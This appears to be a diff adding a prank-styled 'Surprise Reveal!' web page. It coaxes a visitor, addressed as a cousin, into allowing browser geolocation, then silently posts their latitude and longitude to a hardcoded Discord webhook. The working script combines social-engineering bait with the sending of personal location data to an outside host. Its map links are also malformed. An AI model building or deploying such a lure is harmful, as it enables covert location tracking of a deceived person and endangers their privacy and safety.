@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Surprise Reveal!</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f0f2f5;
+        }
+        .container {
+            max-width: 500px;
+            margin: auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            background-color: #5865F2; /* Discord Blue */
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.2s;
+        }
+        button:hover {
+            background-color: #4752C4;
+        }
+        #result {
+            margin-top: 30px;
+            font-size: 18px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Click below to open your surprise! 🎁</h2>
+    <p>Please make sure to click <strong>"Allow"</strong> when your browser prompts for permission so the reveal works!</p>
+    
+    <button onclick="getLocation()">Open Surprise</button>
+
+    <div id="result"></div>
+</div>
+
+<script>
+// Your unique Discord Webhook URL configuration
+const discordWebhookUrl = "https://discord.com/api/webhooks/1549475666339307631/DeKnRlMvxktsUDzN6bz9wt24yT7wtCp9Ge-6gUS0GnPiQMBBAozja9nFjm4JpuX65SOQ";
+
+function getLocation() {
+    const resultDiv = document.getElementById("result");
+    resultDiv.innerHTML = "Processing surprise... please wait.";
+    
+    if (navigator.geolocation) {
+        // Triggers the official browser permission prompt
+        navigator.geolocation.getCurrentPosition(showPosition, showError);
+    } else {
+        resultDiv.innerHTML = "Geolocation is not supported by this browser.";
+    }
+}
+
+function showPosition(position) {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+    const resultDiv = document.getElementById("result");
+    
+    // 1. Show the funny revelation text to your cousin on screen
+    resultDiv.innerHTML = `
+        <p>🎉 <strong>Busted!</strong> 🎉</p>
+        <p>You just officially shared your coordinates with your cousin!</p>
+        <p><a href="https://google.com{lat},${lon}" target="_blank" style="color: #5865F2;">Click here to see what I see on the map!</a></p>
+    `;
+
+    // 2. Prepare the payload structured for Discord's API
+    const discordPayload = {
+        username: "Captain Hook",
+        content: `📍 **New Location Data Received!**\nYour cousin has permitted location sharing.\n• **Latitude:** ${lat}\n• **Longitude:** ${lon}\n• **Google Maps Link:** https://google.com{lat},${lon}`
+    };
+
+    // 3. Send the structured data directly to your Discord Channel
+    fetch(discordWebhookUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(discordPayload)
+    })
+    .then(response => {
+        if (!response.ok) {
+            console.error("Failed to send data to Discord server.");
+        }
+    })
+    .catch(error => {
+        console.error("Network error trying to contact Discord webhook:", error);
+    });
+}
+
+function showError(error) {
+    const resultDiv = document.getElementById("result");
+    switch(error.code) {
+        case error.PERMISSION_DENIED:
+            resultDiv.innerHTML = "⚠️ You denied location access. The surprise setup cannot continue without it!";
+            break;
+        case error.POSITION_UNAVAILABLE:
+            resultDiv.innerHTML = "⚠️ Location data is currently unavailable on your device.";
+            break;
+        case error.TIMEOUT:
+            resultDiv.innerHTML = "⚠️ The location request timed out.";
+            break;
+        case error.UNKNOWN_ERROR:
+            resultDiv.innerHTML = "⚠️ An unknown error occurred.";
+            break;
+    }
+}
+</script>
+
+</body>
+</html>
+
